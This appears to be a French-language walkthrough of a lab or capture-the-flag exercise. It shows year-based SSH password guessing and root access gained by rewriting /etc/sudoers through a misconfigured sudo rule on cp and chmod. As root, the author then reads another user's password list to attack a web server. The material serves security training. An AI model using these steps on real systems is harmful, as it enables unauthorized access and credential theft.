# SSH machine distante

```
Tentative de connexion SSH sur la machine distante :

root@Invictus-Bank:/home/olivier# ssh blythe@192.168.168.180 -p 3632
/$$$$$$                      /$$             /$$                         /$$$$$$$                      /$$      
|_  $$_/                     |__/            | $$                        | $$__  $$                    | $$      
  | $$   /$$$$$$$  /$$    /$$ /$$  /$$$$$$$ /$$$$$$   /$$   /$$  /$$$$$$$| $$  \ $$  /$$$$$$  /$$$$$$$ | $$   /$$
  | $$  | $$__  $$|  $$  /$$/| $$ /$$_____/|_  $$_/  | $$  | $$ /$$_____/| $$$$$$$  |____  $$| $$__  $$| $$  /$$/
  | $$  | $$  \ $$ \  $$/$$/ | $$| $$        | $$    | $$  | $$|  $$$$$$ | $$__  $$  /$$$$$$$| $$  \ $$| $$$$$$/ 
  | $$  | $$  | $$  \  $$$/  | $$| $$        | $$ /$$| $$  | $$ \____  $$| $$  \ $$ /$$__  $$| $$  | $$| $$_  $$ 
 /$$$$$$| $$  | $$   \  $/   | $$|  $$$$$$$  |  $$$$/|  $$$$$$/ /$$$$$$$/| $$$$$$$/|  $$$$$$$| $$  | $$| $$ \  $$
|______/|__/  |__/    \_/    |__/ \_______/   \___/   \______/ |_______/ |_______/  \_______/|__/  |__/|__/  \__/

blythe@192.168.168.180's password: 
Permission denied, please try again.
blythe@192.168.168.180's password: 

Le mot de passe ne fonctionne pas. Mais on peut noté que le mot de passe est composé d'une année : l'anné 2017.
Il est possible que ce mot de passe ait été changé. Nous allons donc essayé avec 2018, 2019, 2020, 2021,...

root@Invictus-Bank:/home/olivier# ssh blythe@192.168.168.180 -p 3632
/$$$$$$                      /$$             /$$                         /$$$$$$$                      /$$      
|_  $$_/                     |__/            | $$                        | $$__  $$                    | $$      
  | $$   /$$$$$$$  /$$    /$$ /$$  /$$$$$$$ /$$$$$$   /$$   /$$  /$$$$$$$| $$  \ $$  /$$$$$$  /$$$$$$$ | $$   /$$
  | $$  | $$__  $$|  $$  /$$/| $$ /$$_____/|_  $$_/  | $$  | $$ /$$_____/| $$$$$$$  |____  $$| $$__  $$| $$  /$$/
  | $$  | $$  \ $$ \  $$/$$/ | $$| $$        | $$    | $$  | $$|  $$$$$$ | $$__  $$  /$$$$$$$| $$  \ $$| $$$$$$/ 
  | $$  | $$  | $$  \  $$$/  | $$| $$        | $$ /$$| $$  | $$ \____  $$| $$  \ $$ /$$__  $$| $$  | $$| $$_  $$ 
 /$$$$$$| $$  | $$   \  $/   | $$|  $$$$$$$  |  $$$$/|  $$$$$$/ /$$$$$$$/| $$$$$$$/|  $$$$$$$| $$  | $$| $$ \  $$
|______/|__/  |__/    \_/    |__/ \_______/   \___/   \______/ |_______/ |_______/  \_______/|__/  |__/|__/  \__/

blythe@192.168.168.180's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

346 packages can be updated.
292 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Fri Sep 15 03:58:35 2023 from 192.168.168.135
$ 


Le mot de passe était finalement celui avec l'année 2020 !
Nous pouvons repartir sur de la reconnaissance.

$ whoami
blythe
$ ls -la
total 116
drwxr-xr-x 16 blythe direction 4096 Sep 15 02:22 .
drwxr-xr-x  6 root   root      4096 Sep 15 01:05 ..
-rw-------  1 blythe direction 9296 Sep 15 03:56 .bash_history
-rw-r--r--  1 blythe direction  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 blythe direction 3771 Apr  4  2018 .bashrc
drwx------ 13 blythe direction 4096 Feb 26  2020 .cache
drwx------ 11 blythe direction 4096 Oct 31  2019 .config
drwxr-xr-x  2 blythe direction 4096 Oct 31  2019 Desktop
drwxr-xr-x  2 blythe direction 4096 Sep 13 04:22 Documents
drwxr-xr-x  2 blythe direction 4096 Sep 14 06:50 Downloads
-rw-r--r--  1 blythe direction 8980 Apr 16  2018 examples.desktop
drwx------  3 blythe direction 4096 Oct 31  2019 .gnupg
-rw-------  1 blythe direction 5092 Mar 26  2020 .ICEauthority
drwx------  3 blythe direction 4096 Oct 31  2019 .local
drwx------  5 blythe direction 4096 Feb 26  2020 .mozilla
drwxr-xr-x  2 blythe direction 4096 Oct 31  2019 Music
drwxr-xr-x  2 blythe direction 4096 Oct 31  2019 Pictures
-rw-r--r--  1 blythe direction  807 Apr  4  2018 .profile
drwxr-xr-x  3 blythe direction 4096 Sep 14 06:57 Public
-rw-r--r--  1 blythe direction   66 Sep 14 07:07 .selected_editor
drwx------  2 blythe direction 4096 Sep 15 02:22 .ssh
drwxr-xr-x  2 blythe direction 4096 Oct 31  2019 Templates
drwxr-xr-x  2 blythe direction 4096 Oct 31  2019 Videos
-rw-------  1 blythe direction  104 Sep 14 07:20 .Xauthority
$ 

$ ls ..
blythe  olivier  ryerson
$ cd ../ryerson 
-sh: 5: cd: can't cd to ../ryerson

Nous n'avons pas les droits d'aller dans le dossier des autres utilisateurs.
Nous allons donc élever nos privilèges.

$ sudo su
[sudo] password for blythe: 
Sorry, user blythe is not allowed to execute '/bin/su' as root on ubuntu.

$ sudo -l
[sudo] password for blythe: 
Matching Defaults entries for blythe on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User blythe may run the following commands on ubuntu:
    (root) /bin/chmod * /tmp/*, /bin/cp
$ 

Nous allons exploiter la mauvaise configuration de sudo qui nous permet de modifier des droits (chmod) dans le dossier tmp, ainsi que de copier des fichiers
$ sudo cp /etc/sudoers /tmp/
$ ls -l /tmp/sudoers
-r--r----- 1 root root 858 Sep 15 13:48 /tmp/sudoers
$ chmod a+rw /tmp/sudoers 
$ ls -l /tmp/sudoers
-rw-rw-rw- 1 root root 858 Sep 15 13:48 /tmp/sudoers
$ vi /tmp/sudoers
... Modification du fichier sudoers pour remplacer la ligne  ...............
		“blythe ALL=(root) /bin/chmod * /tmp/*,/bin/cp”
		par
		“blythe  ALL=(ALL:ALL) ALL” 
...................................................................................................
$ vi /tmp/sudoers
$ grep blythe sudoers
grep: sudoers: No such file or directory
$ grep blythe /tmp/sudoers
blythe  ALL=(ALL:ALL) ALL

$ sudo chmod go-rw /tmp/sudoers
$ sudo cp /tmp/sudoers /etc/sudoers
$ sudo su
root@ubuntu:/home/blythe# 
root@ubuntu:/home/blythe# whoami
root

Nous pouvons maintenant parcourir le dossier de ryerson
root@ubuntu:/home/blythe# ls -l ../ryerson/
total 44
drwxr-xr-x 2 ryerson infosec 4096 Oct 31  2019 Desktop
drwxr-xr-x 2 ryerson infosec 4096 Sep 13 04:23 Documents
drwxr-xr-x 2 ryerson infosec 4096 Oct 31  2019 Downloads
-rw-r--r-- 1 ryerson infosec 8980 Apr 16  2018 examples.desktop
drwxr-xr-x 2 ryerson infosec 4096 Oct 31  2019 Music
drwxr-xr-x 2 ryerson infosec 4096 Oct 31  2019 Pictures
drwxr-xr-x 2 ryerson infosec 4096 Oct 31  2019 Public
drwxr-xr-x 2 ryerson infosec 4096 Oct 31  2019 Templates
drwxr-xr-x 2 ryerson infosec 4096 Oct 31  2019 Videos
root@ubuntu:/home/blythe# ls -l ../ryerson/Documents/
total 8
-rw-r----- 1 ryerson infosec 7577 Nov  6  2019 webaccess.txt
root@ubuntu:/home/blythe# head ../ryerson/Documents/webaccess.txt 
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon

Nous avons récupéré une liste de mot de passe.
Nous allons nous en servir pour rentrer sur le serveur web.
```
